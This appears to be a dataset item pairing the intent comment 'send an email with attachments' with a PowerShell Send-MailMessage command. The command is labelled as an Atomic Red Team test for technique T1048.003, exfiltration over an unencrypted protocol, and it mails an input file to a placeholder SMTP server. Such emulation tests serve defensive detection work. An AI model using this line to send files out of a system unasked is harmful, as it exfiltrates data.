# Natural language intent:
# Send an email with specified parameters, including attachments.

Send-MailMessage -From ${sender_user} -To ${receiver_user} -Subject "T1048.003 Atomic Test" -Attachments ${inputF} -SmtpServer ${SMTPsrv}
